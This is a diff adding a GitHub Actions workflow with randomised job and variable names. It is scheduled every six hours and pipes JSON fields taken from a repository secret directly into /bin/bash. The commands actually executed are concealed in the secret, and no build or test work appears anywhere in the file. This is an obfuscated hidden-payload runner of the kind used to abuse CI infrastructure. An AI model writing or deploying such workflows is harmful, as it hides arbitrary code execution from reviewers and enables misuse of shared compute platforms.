@@ -1,0 +1,24 @@
+name: xiangbanbai6745
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangbanbai6745
+        env:
+          lplas39: ${{ secrets.lplas39 }}
+        run: |
+          echo $lplas39 | jq -r .jam796 | /bin/bash
+          echo $vsgc8921 | jq -r .ctiid7241 | /bin/bash
+          echo $ytx34 | jq -r .nmf78598 | /bin/bash
+          echo $vfxtm00 | jq -r .o65 | /bin/bash
+          echo $a029 | jq -r .e36190 | /bin/bash
+          echo $tnfgc6 | jq -r .w0 | /bin/bash
+          echo $pdc22 | jq -r .zo54 | /bin/bash
+
